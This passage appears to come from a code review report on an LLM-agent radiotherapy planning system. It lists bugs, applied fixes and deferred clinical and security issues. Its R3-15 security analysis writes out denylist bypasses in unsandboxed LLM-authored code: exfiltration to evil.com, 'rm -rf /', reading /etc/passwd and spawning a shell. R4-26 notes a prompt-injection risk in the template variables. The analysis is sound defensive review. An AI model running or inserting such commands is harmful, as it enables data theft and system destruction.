**Suggested fix:** Escape braces before formatting: `.replace('{', '{{').replace('}', '}}')`, then use `.format()`.

---

**R4-12. `brain/knowledge/rag.py:96-111` — Hardcoded dose constraints with contradictions to `knowledge_base.json`**

**File:** `brain/knowledge/rag.py`

The `_default_response` dict and `DoseRAG` contain hardcoded dose constraint tables:
```python
"prostate": {"rectum": {"D2cc": 35.0}, "urethra": {"D0.1cc": 38.0}, "bladder": {"D2cc": 40.0}}}
"pancreas": {"duodenum": {"D0.1cc": 30.0}, "stomach": {"D0.1cc": 30.0}}
"lung": {"spinal_cord": {"D0.1cc": 10.0}, "heart": {"V100": 25.0}}
```
These have **no source citations** and **directly contradict** the data in `knowledge_base.json` (chunks 8-9):
- RAG.py: `prostate.rectum.D2cc = 35.0 Gy`
- knowledge_base.json chunk 8: `rectum` → `D2cc < 75 Gy (EQD2)` — 40 Gy higher!
- This is a 40 Gy discrepancy with no explanation.

The `DoseRAG` class at lines 113-120 provides a separate parallel code path from `SimpleRAG.retrieve()`, creating two paths for dose constraints that can give different answers.

**Suggested fix:** Remove hardcoded dose constraints from `rag.py`. Load all constraints from `knowledge_base.json` (with cited sources) or from `clinical_kb/`. Reconcile the contradictions.

---

**R4-13. `brain/knowledge/rag.py:47` — "RAG" is keyword token overlap, not semantic retrieval**

**File:** `brain/knowledge/rag.py:47`

`SimpleRAG.retrieve()` does `any(keyword in text for keyword in query_lower.split())` — plain substring keyword matching. No embeddings, no vector search, no semantic similarity. A query like "What is the spinal cord dose constraint?" would match any chunk containing the word "dose" or "cord", flooding results with irrelevant chunks. This is pattern matching, not Retrieval-Augmented Generation.

**Suggested fix:** Implement proper embedding-based retrieval or BM25/TF-IDF at minimum.

---

**R4-14. `agents/completeness_checker.py:194` — 30% keyword overlap threshold is arbitrary and untuned**

**File:** `agents/completeness_checker.py:194,199`

`len(req_words & resp_words) >= max(1, len(req_words) * 0.3)`. For a 1-keyword requirement ("segment"), threshold is 1 match — trivially satisfied by any sentence containing "segment" (false pass). For a 10-keyword requirement, needs 3 matches — may miss semantically equivalent but lexically different responses (false miss). No synonym expansion for clinical terms.

---

**R4-15. `agents/base_agent.py:17-22, 145-159` — Silent fallback when prompts absent**

**File:** `agents/base_agent.py`

If `from config.prompts.multi_agent import get_prompt` raises `ImportError`, `_PROMPTS_AVAILABLE = False` and `_load_system_prompt()` returns `""` silently. All agents run with ZERO system prompt — model behavior changes radically with no observable error.

---

### Round 4: MEDIUM findings (latent bugs, silent failures, performance)

---

**R4-16.** `planning_pipeline.py:527-534` — Documented `seed_info`/`planning_params` input kwargs accepted but silently ignored (latent — no caller passes them)

**R4-17.** `planning_pipeline.py:1098` — Python precedence bug: `agent.memory.retrieve(...) or agent.memory.retrieve(...) if agent else None` — when `agent is None`, the `agent.memory` raises `AttributeError` before the `if agent else None` guard because `or` binds before `if-else`. Fix: `(...) if agent else None`

**R4-18.** `AgenticSys.py:1041` — OAR dedup threshold `>= 50` hardcoded. Works for TotalSegmentator v2 (104 classes) but a subset model (~30 classes) never triggers dedup; OAR re-runs every time (30-60s GPU waste).

**R4-19.** `AgenticSys.py:1443-1445` — Auto-planning trigger hardcodes `mode="rl"` regardless of user config. If user configured `rule_based` planning, the auto-trigger uses RL mode anyway, producing different clinical output.

**R4-20.** `agents/orchestrator.py:193-195` — `asyncio.get_event_loop()` (deprecated in Python 3.12, may raise `RuntimeError` in 3.14+). Potential hard failure on Python upgrade.

**R4-21.** `agents/plan_reviewer.py:167-176` — Hardcoded advisory thresholds (`V100 < 0.80`, `V150 > 0.60`, etc.) contradicting the docstring statement that "thresholds are accepted only from runtime configuration." Incorrect for HDR brachytherapy where V150 > 0.60 is expected.

**R4-22.** `agents/safety_guardian.py:289-313` — Code duplication: `_dose_ratio_or_fraction`, `_normalized_fraction`, `_metric_value`, `_first_numeric`, `_target_checks` all duplicated from `plan_reviewer.py` with slight differences. Maintenance hazard.

**R4-23.** `brain/knowledge/knowledge_base.json` — Only 15 chunks, very limited coverage. Missing: pancreas-specific constraints, liver, cervical cancer, fractionation schedules, isotope activity ranges, TG-43/TG-186 formalism. No source citations (no PMID/DOI) for any constraint — LLM cannot cite sources.

**R4-24.** `config/prompts/orchestrator.md:20-24` — Hardcoded quality-gate thresholds in LLM prompt: `Score ≥ 7: pass`, `Score 5-6: conditional`, `Score < 5: reject`, `Reviewer confidence < 0.5: escalate`, `Score divergence > 3: escalate`. Should be configurable.

**R4-25.** `config/prompts/__init__.py` — `_load_prompt` silently returns `""` on file-not-found. Missing `clinical_kb.md` or `medical_safety.md` silently strips safety from system prompt.

**R4-26.** `config/prompts/system_prompt.md:80-84` — Template variables `{ui_state_summary}`, `{enhanced_context}`, `{clean_context}` — if the rendering side doesn't sanitize these, user-controlled content can inject instructions. Latent injection vector — depends on caller.

**R4-27.** `dose_pre/` is a byte-for-byte duplicate of `plans/dose_pre/` with minor divergences. `myDoseNet.py` imports `import os; import sys` dead code (lines 5-7). `Predict_crop.py` has `min=-1000; max=3000` shadowing Python builtins. No `__init__.py` so `from dose_pre import Predict_crop` fails.

**R4-28.** `dose_pre/myDoseNet.py:131` — `inplace=True` on LeakyReLU can interfere with gradient checkpointing if model is ever re-used for training. Inference-only currently, but latent risk.

**R4-29.** `brachybot.py:121` — `_run_server` calls `web.server.run_server(port=port)` with no try/except. If port is in use, Flask raises OSError with full traceback — no helpful error message.

**R4-30.** `brachybot.py:106` — `import web.server` inside `_run_server` not wrapped in try/except. If `web/server.py` has an import error, the server crashes with traceback rather than a user-friendly message.

**R4-31.** `brachybot.py:108-117` — Startup message duplicates LLM-detection logic. Only checks Anthropic and OpenAI — users of DeepSeek, Qwen, Gemini, etc. see no startup message.

**R4-32.** `brachybot.py:11-12` — `sys.path.insert(0, ...)` shadows system packages. If a PyPI package named `config` or `skills` existed, the local module shadows it.

**R4-33.** `brain/demos/demo.py:124` — `OpenRouterLLM.__new__(OpenRouterLLM)` bypasses `__init__()`, potentially omitting credential/config loading from the demo.

**R4-34.** `tests/` — Only 4 test files with limited coverage. `test_multi_agent_phase3.py` (409 lines) is the only substantive integration test. No tests for: planning_pipeline, AgenticSys state management, planning_routes endpoints, agents/orchestrator.

**R4-35.** `planning_pipeline.py:397-423` — No GPU memory cleanup after dose model inference. `torch.cuda.empty_cache()` is not called. Long-running agent sessions may accumulate GPU memory.

---

### Round 4: LOW findings

---

**R4-36.** `brain/knowledge/rag.py:34` — `hashlib.md5(...)` raises `ValueError` in FIPS-compliant environments. Use `hashlib.md5(usedforsecurity=False)`.

**R4-37.** `clinical_kb/__init__.py:31,103` — `KB_DIR.mkdir(...)` and `_ensure_default_kb()` run on module import. Read-only filesystem crash.

**R4-38.** `safety_validator/__init__.py:284-288` — Strict mode threshold mapping only covers 10 specific values. Any threshold not in the map (e.g., 0.92) is not tightened.

**R4-39.** `safety_validator/__init__.py:340-341` — `oar_data.get("dmax", 0) or oar_data.get("Dmax", 0)` — if dmax is exactly 0, falls through to Dmax. If both are 0, correct value is lost.

**R4-40.** `AgenticSys.py:1623` — `list(self.memory.planning_results.keys())[:10]` assumes `planning_results` is always a dict. Latent — safe today because `clear_all_data()` does `.clear()` not `= None`.

**R4-41.** `AgenticSys.py:41` — Dead import: `SYSTEM_PROMPT_TEMPLATE`, `get_prompt_modules` imported but never used.

**R4-42.** `AgenticSys.py:1036,1051,1266,1535` — `from tool_factory import ToolResult` inside method bodies (4 places). Python caches imports, but violates convention and breaks linting.

**R4-43.** `AgenticSys.py:1476-1498` — `_VALIDATORS`/`_RECOVERY_ACTIONS` defined as class attributes (shared across instances). Not mutated today, but latent if code evolves.

**R4-44.** `agents/base_agent.py:188` — `call_llm` type-annotated as `Optional[Callable]` (sync). If caller passes async callback, `json.loads()`/`strip()` on the returned coroutine crashes.

**R4-45.** `agents/base_agent.py:67-68` — Failed messages remain in `message_history`. `get_stats()["success_rate"]` skews.

**R4-46.** `agents/fact_checker.py:341,345` — Uses hardcoded emoji "📌" in output. On CLI/log without emoji support, renders as garbled.

**R4-47.** `agents/plan_reviewer.py:346` — `_MEDICAL_SYSTEM_PROMPT[:2500]` silently truncates the medical knowledge base beyond 2500 chars.

**R4-48.** `agents/safety_guardian.py:24-25` — `SafetyGuardian` accepts `llm_callback` but never uses it. Dead parameter.

**R4-49.** `agents/plan_reviewer.py:250-254` — OAR constraint matching uses `key in organ_lower or organ_lower in key` substring overlap — "rectum" matches "rectum_sigmoid" (reasonable) but "bowel" matches "small_bowel" (potentially wrong limit).

**R4-50.** `agents/router_agent.py:238-241` — `keyword.lower() in input_lower` — `"plan"` matches "implantation", "explanation", "planetary". For short keywords (<5 chars), use word-boundary regex.

---

### Round 4: Verified false positives (NOT bugs — intentional or canceled)

These were flagged by review agents but on tracing are intentional or don't trigger:

- `planning_pipeline.py:1111-1114` normalized dose with output_range = window_range. Intentional identity normalization; actual scaling happens later in `normalize_dose_array`. Harmless.
- `planning_pipeline.py:1142-1145` iterates `plan_res` as flat list. The pipeline path stores `core.optimal_plan` result as `plan_res`, then iterates `for entry in plan_res`. Each entry is `[traj, seeds, doses]` — works correctly with the flat return. Only the `seed_planning.py` standalone tools have the unpacking bug (R4-1).
- `seed_planning_rl.py:175` checks `len(entry) >= 3`. `seed_planning.py:220` checks `len(entry) >= 2`. These are different tools with different output schemas — intentional.
- `quality/quality_gate.py` `passed=True` design is documented append-only semantics. Not a bug.
- `clinical_kb/__init__.py:394` — `kb.get("dose_constraints", {}) or kb.get("legacy_dose_constraints", {})` — empty dict falls through to legacy. Intentional backward-compat.

---

### Round 4: Existing report findings re-confirmed

- R3-11 (RAS↔LPS coordinate frame in `utilizations.py`): confirmed through full call chain trace and connected to pipeline lines 867-870.
- R3-12/13/14 (hardcoded clinical thresholds): confirmed in `plan_reviewer.py:167-176`, `quality_decider.py`, `clinical_decider.py`. New instances found in `orchestrator.md:20-24` (prompt-side thresholds).
- R3-15 (tool_code_writer arbitrary code execution): unchanged.
- R3-16 (case_executor silent step-dropping): unchanged.

---



### Summary — confirmed real bugs (FIXED)

All fixes below are behaviorally verified with focused unit-style assertions; source files compile cleanly under `py_compile`. The annotation discipline from the previous rounds (false-positive labelling preserved, hardcoded clinical thresholds left untouched pending a config-plumbing refactor) is applied throughout.

| ID | File:Line | Sev | Description of bug | Fix |
|----|-----------|-----|--------------------|-----|
| R3-1 | `memory/skill_learner.py:128-...`  | HIGH | `learn_parameter_preferences` round-tripped `tool_name.key=value` through `rsplit('.', 1)` and produced `param_name = "mode=rl"`. The downstream `preference_store.update_from_learned` stored the key as `f"{tool_name}_{param_name}"` = `"seed_planning_mode=rl"`, but `apply_to_tool_params` looks up `f"{tool_name}_{key}"` = `"seed_planning_mode"` — keys never matched, so every learned parameter preference was silently stored but never applied back to tools. | Split on `=` first to recover `param_name = "mode"` and `value = "rl"` separately. |
| R3-2 | `memory/self_evolution.py:132-...`  | HIGH | `_update_existing_skills` iterated `self.skill_registry.list_skills()`, which returns throwaway summary `dict`s `{"name","category","success_rate","usage_count","last_used"}`. Mutations to those dicts only edited the throwaway copy; the underlying `SkillRegistry.skills` and the on-disk `skills_registry.json` were silently untouched. The entire "update existing skills" feature was a no-op. | Iterate `skill_registry.skills.values()` directly; set `skill.usage_count` and `skill.success_count` so that the `success_rate()` method reflects the matching experiences; call `skill_registry._save_skill(skill)` to persist. |
| R3-3 | `skills/skill_base.py:130-...` | MED | `evolve_from_interactions` appended a freshly-created `Skill` to `new_or_updated` at the `else` branch (line 138) AND unconditionally again at line 142. Every new skill appeared twice in the returned list — minor data hygiene, but the returned list drives UI/JSON output. | Capture `is_new_skill` before logic, append only once per iteration. |
| R3-4 | `memory/layered_memory.py:325-...` & `:341-...` | HIGH | `find_sop` incremented `best_sop.usage_count` on every query, and `update_sop_metrics` divided by `n+1` where `n = sop.usage_count` (already counting this query). Combined effect: EMA off-by-one; first `update_sop_metrics(success=True)` set `success_rate = (0*1 + 1)/2 = 0.5` instead of `1.0`, then `usage_count` was double-incremented per successful use. | Remove the `usage_count += 1` from `find_sop` (only `last_used` is updated there); in `update_sop_metrics` set `n = sop.usage_count` (count BEFORE this use), then `sop.usage_count = n + 1`, then `success_rate = (success_rate * n + new)/ (n+1)`. |
| R3-5 | `plans/brachy_plan_v2.py:182-...` | HIGH | Exception handler assigned `dose_image = sitk.GetArrayFromImage(...).astype(np.float32)` (NumPy array), then continued. Downstream `core.optimal_plan_rf → batch_seed_dose_calculation_dl` calls `dose_image.GetDirection()/GetSpacing()/GetOrigin()` and resolves via `sitk.GetArrayFromImage(dose_image)` — all `AttributeError` on a NumPy array, swallowed by the outer `try/except`, leaving the patient an empty plan with no error message. | Replace the `pass` + numpy fallback with `raise`, matching the non-rf `brachy_plan` path at line 48. Failure surfaces instead of silently corrupting the pipeline. |
| R3-6 | `brain/core/tree_search_planner.py:79-...` | MED | `_node_cache` was a `self` attribute initialized lazily inside `_store_node` and never cleared between `search()` calls. Long-running agents that plan repeatedly accumulated `PlanningNode`s unbounded — memory leak + stale stats bleeding across invocations. | Reset `self._node_cache = {}` at the top of every `search()`. |
| R3-7 | `agent_runtime/chat_workflows.py:480-...` (4 sites) | MED/HIGH | Four sites (`chat_with_trace` completeness, `chat_with_stream` review, `chat_with_stream` direct-completeness, `chat_with_stream` post-enforcer) created a new event loop, ran `loop.run_until_complete(...)`, closed the loop in `finally` — but never restored the prior global event loop. After every chat round, the global event loop was a CLOSED loop, breaking any downstream code that called `asyncio.get_event_loop()`. | Capture `prev_loop = asyncio.get_event_loop_policy().get_event_loop()` before `_loop = new_event_loop()`; in `finally`, restore `set_event_loop(prev_loop)`. |
| R3-8 | `web/routes/planning_routes.py:1903` | LOW | `getattr(agent.memory, "patient_data", {}).get("id", "UNKNOWN")` deref'd `.get` directly. If `patient_data` was explicitly set to `None` (legitimate value — patient cleared but attribute still exists), `.get` raised `AttributeError`, aborting the PDF/HTML report builder. | `(getattr(agent.memory, "patient_data", None) or {}).get("id", "UNKNOWN")` — handles None. |
| R3-9 | `agent_runtime/core.py:457-...` | MED | `AgentMemory.compact()` trimmed `self.conversation` to `keep_last` and rolled the summary into `self.context_summary`, but never notified `self.smart_context`. `SmartContextManager.messages` and the `entities`/`topics` dicts grew unbounded; `get_relevant_context` scored already-summarized messages forever -> long-session memory leak + slow retrieval. | After trimming `conversation` under the lock, prune `self.smart_context.messages` to the same `keep_last` count. |
| R3-10 | `plans/visualizer.py:1-...` | MED | Top-level `import vtk` + `import matplotlib.pyplot` made `plans.utilizations` (the main planning entry) fail to import in any Python environment lacking VTK or matplotlib. The only internal consumer in BrachyBot is `utilizations.draw_radiations`, which itself has NO internal BrachyBot callers (dead visualization path). Hard dep blocked headless deployments. | Wrap both imports in `try/except ImportError`; set `vtk = None`/`plt = None` on failure. VTK-dependent functions still raise at call-time if VTK is absent, but module import succeeds. |

### Summary — confirmed real bugs (ANNOTATED, NOT FIXED — fix is risky/unsure)

For these, the bug is real but the fix requires either clinical-discipline review (cannot change clinical output safely without sign-off) or large-scope refactor (security sandbox, OAR-config plumbing). They are flagged with `# REVIEW:` in source so future reviewers see them in-place.

| ID | File:Line | Sev | Why fix is deferred |
|----|-----------|-----|---------------------|
| R3-11 | `plans/utilizations.py:ras_direction_to_voxel` + `compute_body_shell_and_ref_direction` | HIGH (latent) | `ras_direction_to_voxel` computes `v = (ras_direc @ direction) / spacing` where `direction` is SimpleITK's LPS direction-cosine matrix. Per the function name and the organ-default comments in `tool_factory/seed_plan/planning_pipeline._ORGAN_DEFAULT_REFDIREC` ("pancreas=[0,-1,0] posterior"), the input is RAS — but no RAS→LPS sign flip is applied. Symmetrically, `compute_body_shell_and_ref_direction` math produces a vector in LPS but labels it `ras_direction`. Used together, the two bugs cancel; used independently (e.g. hand-set RAS default), the needle approach direction is mirrored along x/y. Fix would change clinical planning output, requires maintainer verification of canonical input convention. |
| R3-12 | `brain/core/multi_agent_critic.py:211-...` | MED | Hardcoded clinical thresholds in `_fallback_critique`: `D90 < 100%`, `D90 > 150%`, `V100 < 90%`. Project rule requires clinical thresholds from `clinical_kb`/`plan_config`. Fix requires plumbing config into the critic; these only fire when the LLM critique fails, so they're last-resort. Annotated. |
| R3-13 | `brain/deciders/quality_decider.py:138-...` and `:197-...` | MED | Hardcoded scoring bands for V100/V150/V200/D90/homogeneity and hardcoded OAR dose constraints (rectum=2x, bladder=1.5x, urethra=1.2x, bowel=0.8x, kidney=0.2x of PD). Same fix path (config plumbing). Annotated. |
| R3-14 | `brain/deciders/clinical_decider.py:124-...` | MED | Hardcoded default `thresholds = {"v100":0.90,"v150":0.35,"v200":0.15,"d90":1.0}`. Same issue — caller override exists via arg, but fallback is in code. Annotated. |
| R3-15 | `brain/core/tool_code_writer.py:198` | HIGH (security) | `spec.loader.exec_module(module)` runs arbitrary LLM-authored Python in the host process. `_validate_code` only substring-denylists (`eval(`, `__import__`, ...) — trivially evaded. A malicious or hallucinated tool spec executes as the server user. NOT FIXED — requires sandbox architecture (restricted namespace, no `os`/`socket`/`subprocess`) and human approval gate. Annotated. |
| R3-16 | `brain/execution/case_executor.py:248-...` | MED | `"Completed {len(plan)} steps successfully"` uses the requested plan length even when `resolve_execution_order` silently breaks on cyclic/unreachable deps (line 117/118), dropping steps from `result.steps`. User is told all N steps completed even if some never ran. Annotated; fix needs to surface dropped steps as FAILED. |

### Detailed analysis — confirmed real bugs (ANNOTATED, NOT FIXED)

Each entry below traces the bug path through the full call chain and documents why a
confident, safe fix cannot be produced without broader clinical or architectural context.

---

#### R3-11. `plans/utilizations.py` — RAS/LPS coordinate-frame mismatch (paired functions)

**Location:** `ras_direction_to_voxel` (:477) and `compute_body_shell_and_ref_direction` (:450)

**Severity:** HIGH (latent in production — cancel pair unless one path is used independently)

**Claim:** `ras_direction_to_voxel` treats its input as LPS; `compute_body_shell_and_ref_direction` labels its output "RAS" but produces LPS. When used together, the two errors cancel. When either function is used independently with true RAS input, the result is wrong.

**Step-by-step trace of `ras_direction_to_voxel` (`utilizations.py:489`):**
```
def ras_direction_to_voxel(ras_direc, image):
    direction = np.array(image.GetDirection()).reshape(3, 3)
    v = (np.array(ras_direc) @ direction) / spacing
```
- `image.GetDirection()` returns SimpleITK's direction-cosine matrix, which is by convention **LPS** (not RAS).
- For an orthonormal direction matrix `D`, `ras @ D = D.T @ ras.T`. Geometrically, this treats the input vector as expressed in the coordinate frame of `D` — i.e., LPS.
- To convert a true RAS vector into the LPS frame before applying `D`, the convention is:
  `lps = ras * [-1, -1, 1]`  (negate x and y, leave z unchanged).
- The function does **not** apply this flip.

**Step-by-step trace of `compute_body_shell_and_ref_direction` (`utilizations.py:464`):**
```
normal_phys_xyz = normal_phys[::-1]           # from [z,y,x] PCA frame → [x,y,z]
ras_direction = normal_phys_xyz @ direction_matrix.T
```
- `direction_matrix` is SimpleITK's LPS direction matrix (passed in or identity). Multiplying `normal_phys_xyz @ D.T` produces a vector in the same frame as `D`, which is **LPS**.
- But the variable is named `ras_direction` and returned as `ref_direction_ras`, documented as RAS.

**Call-site pairing — why it cancels for auto-detection:**
The auto-detection path (`plans/utilizations.py:compute_body_shell_and_ref_direction` → returns "RAS" label / actually LPS) feeds into `ras_direction_to_voxel` (takes "RAS" label / treats as LPS). Both label as RAS; both use LPS math. Result: the two wrongs make a right for this specific paired path.

**Why the organ-default path breaks:**
The organ-specific defaults in `tool_factory/seed_plan/planning_pipeline._ORGAN_DEFAULT_REFDIREC` are documented as true RAS:
```
# pancreas   : posterior [-Y]   (in RAS: -Y = posterior ✓)
# prostate   : posterior [-Y]
```
These values `[0, -1, 0]` (pancreas, prostate) are then passed through `_convert_ref_direc_to_voxel` (`planning_pipeline.py:188`), which calls `ras_direction_to_voxel(np.array(ref_direc_ras), ct_image)`. Since the input is TRUE RAS but the function treats it as LPS, the x and y components end up sign-inverted. For a needle approach direction, this means "posterior" → "anterior" — the needle would be planned from the wrong side of the body.

**Fix that would change clinical output:**
Insert before line 489:
```python
ras_direc = np.asarray(ras_direc) * np.array([-1.0, -1.0, 1.0])
```
**Why NOT fixed:** The fix changes clinical planning output on every call that uses organ defaults. The "auto-detection" path would need the same correction at the `compute_body_shell_and_ref_direction` return. Without full verification by the domain expert who defined the default directions, this would silently flip needle approach for all existing patients. Deferred to maintainer.

---

#### R3-12. `brain/core/multi_agent_critic.py:211-…` — Hardcoded clinical thresholds in `_fallback_critique`

**Location:** `multi_agent_critic.py`, method `_fallback_critique`, lines ~211–228

**Severity:** MEDIUM (last-resort fallback; LLM critique is the primary path)

**Issue:**
```python
if d90_val < 100:                    # D90 below 100% threshold
if d90_val > 150:                    # D90 above 150% threshold
if v100_val < 90:                    # V100 below 90% threshold
```
These thresholds are used only when the LLM critique fails (timeout, parse error, empty response) — a rare fallback. They serve as a coarse sanity check for completely broken plans, not for routine clinical scoring.

**Why fix requires config plumbing:**
The `_fallback_critique` method has no access to `plan_config`, `clinical_kb`, or any dose-constraint source. To make these configurable:
1. `MultiAgentCritic.__init__` would need an optional `config: dict` or `dose_constraints: dict` parameter.
2. `_fallback_critique` would read `self.dose_constraints.get("d90_min", 100)`, etc.
3. All call sites that construct `MultiAgentCritic` would need to pass the config.

**Why NOT fixed:** The refactor touches construction sites across `brain/integration/enhanced_agent.py` and `agent_runtime/core.py`. For a last-resort fallback that fires only on LLM failure, the churn-to-safety ratio is poor. Annotated for when config-plumbing is refactored.

---

#### R3-13. `brain/deciders/quality_decider.py` — Hardcoded scoring bands + OAR constraints

**Location:**
- `_score_coverage` (~line 138): scoring bands for V100/V150/V200
- `_score_homogeneity` (~line 167): D90/PD ratio check
- `_score_oars` (~line 197): OAR dose constraints hardcoded:
  ```python
  default_constraints = {
      "rectum": 2.0 * pd,
      "bladder": 1.5 * pd,
      "urethra": 1.2 * pd,
      "bowel": 0.8 * pd,
      "kidney": 0.2 * pd,
  }
  ```
  Plus fallback for unknown OAR: `all_constraints.get(oar_name.lower(), 2.0 * pd)`

**Impact:**
- The coverage scoring bands (V100≥0.95→+15, V100≥0.90→+12, V150≤0.35→+5, etc.) are reasonable for prostate brachytherapy but may be inappropriate for liver/lung/pancreas cases. For example, lung tumors have much higher permissiveness for V150 due to lower prescription dose.
- The OAR constraints use fixed multiples of prescribed dose (bladder=1.5×PD, rectum=2×PD) which match TG-43 prostate guidelines but differ from site-specific constraints (e.g., liver SBRT has different bowel/kidney limits).
- The `constraints` parameter already allows caller-side override via `+1` in `_score_oars`, but the fallback dict is still in code.

**Why NOT fixed:** These constraints require clinical knowledge to set per-site. A full fix would:
1. Move OAR constraints into `clinical_kb/` or `plan_config`, keyed by tumor type.
2. Plumb `plan_config` into `QualityDecider.__init__`.
3. Fall back to hardcoded values only when config is absent.
This is a clinical-config refactor of broader scope than a single fix.

---

#### R3-14. `brain/deciders/clinical_decider.py:124-…` — Hardcoded default thresholds

**Location:** `clinical_decider.py`, `decide_from_metrics` method:
```python
if thresholds is None:
    thresholds = {
        "v100": 0.90,
        "v150": 0.35,
        "v200": 0.15,
        "d90": 1.0,
    }
```

**Impact:** These thresholds gate the `_normalize_metric` scoring, which transforms raw metrics into decision weights. A D90 of 1.0 Gy means the fallback assumes the prescription is exactly 1 Gy before normalization — unrealistic for any clinical case where PD ≠ 1 Gy. However, the `thresholds` parameter accepts caller-provided values; this fallback only fires when the caller (e.g. `QualityGate` at `quality_gate.py:189`) does not pass `dose_thresholds`.

**Why NOT fixed:** Same as R3-13 — requires config plumbing into the decider. Annotated.

---

#### R3-15. `brain/core/tool_code_writer.py:193-201` — Arbitrary code execution from LLM-authored tool spec

**Location:** `tool_code_writer.py`, `register_generated_tool` method:
```python
module = importlib.util.module_from_spec(spec)
sys.modules[name] = module
spec.loader.exec_module(module)          # <--- runs LLM-generated Python
```

**Security analysis:**
The `_validate_code` method (lines 245-263) performs substring-based deny-list checks:
```python
_BLOCKED_PATTERNS = {"eval(", "__import__", "exec(", "...", "...", "importlib"}
```
This is trivially bypassed:
- `os.environ["PATH"]` — no blocked pattern, reads system environment variables
- `urllib.request.urlopen("http://evil.com/exfil")` — no blocked pattern, data exfiltration
- `__import__("os").system("rm -rf /")` — blocked (`__import__`), but `import os; os.system(...)` is NOT blocked
- `pathlib.Path("/etc/passwd").read_text()` — not blocked, reads arbitrary files
- `socket.gethostbyname("evil.com")` — not blocked, DNS exfiltration
- `os.execv("/bin/sh", ["/bin/sh"])` — not blocked
- The `importlib` substring blocks the string `"importlib"` itself, not the actual call pattern

Additionally:
- `sys.modules[name] = module` pollutes the global namespace — a generated tool named `"utils"` shadows real `utils`.
- No sandbox: the LLM-authored code runs with the full privileges of the server process.

**Production trigger:** The code is called from `enhanced_agent.py:_trigger_auto_evolution` when the `SkillCrystallizer` generates a new skill spec and calls `ToolCodeWriter.register_generated_tool`. The spec is LLM-authored via `self_evolution.py:_suggest_code_improvements` → the feedback loop: LLM generates a prompt → LLM generates tool code → code runs unvetted.

**Minimum fixes (not applied):**
1. Replace substring checks with AST whitelist — compile to AST, only allow specific call patterns (e.g. `numpy.*`, `sitk.*`).
2. Remove `os`, `subprocess`, `socket`, `pathlib`, `shutil`, `requests`, `urllib` from the exec namespace.
3. Namespace generated modules as `f"_autogen_{name}"` to prevent shadowing.
4. Gate with a human-in-the-loop toggle: `AGENT_CODE_EXECUTION_ENABLED` env var, default False.

**Why NOT fixed:** The full AST whitelist + namespace sandbox is a ~100-line change with correctness risks for legitimate tool code. The current state is documented for a dedicated security hardening pass.

---

#### R3-16. `brain/execution/case_executor.py:248-…` — Steps silently dropped from plan without user visibility

**Location:** `case_executor.py`:
- `resolve_execution_order` method (~line 113-118): drops steps when dependency cycle is detected
- `execute_plan` result summary (~line 248): `f"Completed {len(plan)} steps successfully"`

**Trace:**
```python
def resolve_execution_order(self, steps):       # line 105
    executed = set()
    phases = []
    while len(executed) < len(steps):
        current_phase = []
        for step in steps:
            step_id = int(step["id"])
            if step_id in executed:
                continue
            deps = self._step_input_refs(step, include_zero=False)
            if all(d in executed for d in deps):
                current_phase.append(step)
        if not current_phase:                    # line 117 - BREAK on empty phase
            break                                # line 118 - silent exit
        phases.append(current_phase)
        ...
```
When the LLM generates a cyclic dependency graph (step A depends on B, B depends on A), the while loop produces an empty `current_phase` and breaks. Steps in the cycle are never assigned to any phase, never executed, and never added to `result.steps`. But `result.summary = f"Completed {len(plan)} steps successfully"` uses the ORIGINAL `len(plan)`, so the user sees "Completed 5 steps" when really only 3 ran and 2 were dropped.

**Mild mitigation in practice:** Some dropped steps will cause later steps to receive missing inputs, which triggers `KeyError` or `None` at execution time. The failed step's error message may contain clues, but the summary is still misleading.

**Fix:** Before setting `result.status = SUCCESS`, compute `executed_ids = {s.step_id for s in result.steps}` and detect `dropped = [s for s in plan if int(s["id"]) not in executed_ids]`. For each dropped step, create a FAILED `StepResult` and append to `result.steps`. Update summary: `f"Completed {len(result.steps)-len(dropped)}/{len(plan)} steps ({len(dropped)} dropped due to unresolved dependencies)"`.

**Why NOT fixed:** The fix changes case_executor.py's error-reporting semantics. The execution pipeline in `brain/execution/plan_executor.py` already has a `FAILED` return on first exception (line 85-89), so adding step-level failure surfaced from dropped deps would need to coordinate with the `_hooks["on_failure"]` path. Safe fix requires understanding what downstream consumers (UI, reporting) expect from `result.steps`. Annotated.

---

### Summary — false positives or already-intended (NOT BUGS)

Re-verified findings from the dispatched agents that on closer tracing are intentional or don't actually trigger. Listed here so they aren't re-flagged.

| ID | File:Line | Claim | Why NOT a bug |
|----|-----------|------|---------------|
| R3-17 | `agent_runtime/chat_workflows.py:~905` | Agent claimed `gather()` missing `return_exceptions=True`. Verified: line 906 passes `return_exceptions=True` correctly. Same applies to `_post_loop.run_until_complete(_asyncio_post_enforcer.gather(..., return_exceptions=True))` at line 1286. Both sites correct. |
| R3-18 | `quality/quality_gate.py:130-...` | Agent claimed "pass_rate is always 1.0 misleading". **Design intent**: the inline comment explicitly documents that `passed=True` is append-only semantically and statistics track aggregate counts; not a correctness bug. |
| R3-19 | `plans/reinforcement.py` C1/C3 | Re-confirming previous round: `out_damage = covered / exceed_count` is ADDED to reward, shrinks with OAR overdose — correct. (Already annotated in source.) |
| R3-20 | `web/server.py:131` | Agent claimed "min() of empty timestamps possible". Trace: both `_sessions` and `_session_timestamps` are mutated under the same lock with `pop(key, None)`; they stay in lockstep. The check `len(_sessions) >= _max_sessions` is also guarded. Latent-fragility only. |
| R3-21 | `web/routes/planning_routes.py:80` | Agent claimed "dict mutation race on planning_results clear". GIL atomicity protects the `if key in ...: del ...` per-key pattern. The 4 minor concurrent-tab scenarios are already mitigated by the `agent.memory._lock` used elsewhere; explicit lock acquisition is a cosmetic improvement only. |
| R3-22 | `plans/utilizations.py:600-604` (np.isin mask) | Claimed "fragile / corrupts float voxels". Trace: function always uses `sitkNearestNeighbor` interpolation, so every output voxel is an exact copy of some input voxel; `np.isin` is all-True and the `else` branch never fires. Dead code; does not corrupt output. |
| R3-23 | `plans/utilizations.py:218` (`direction_transform` Frobenius norm) | Claimed "wrong for batched (n,3) input". All current callers (core.py:317, utilizations.py:932/1033/2603/2392) pass single 3-vectors. Documented API but doesn't trigger. |
| R3-24 | `agent_runtime/llm_runtime.py:497,532,1866` | Step-status text matching ("Error/Exception"). Confirmed: production tool outputs DO sometimes contain those substrings as benign nouns; misclassification risk exists. NOT FIXED because the heuristic gates only the `success` flag for safety next-step in stream — the underlying tool result is preserved. Awaiting better `tool_result.success`-based gate plumbing. |
| R3-25 | `plans/core.py:137,348` (`distance_transform_edt` without `sampling=`) | "voxels vs mm". Verified by trace: `distance_map` is consumed by `get_available_position` which compares against `seed_volume_length` (also in voxel units via `seed_info['length']/spacing`). Self-consistent even if unit-ambiguous. Documentation concern only. |

### Detailed fidelity notes

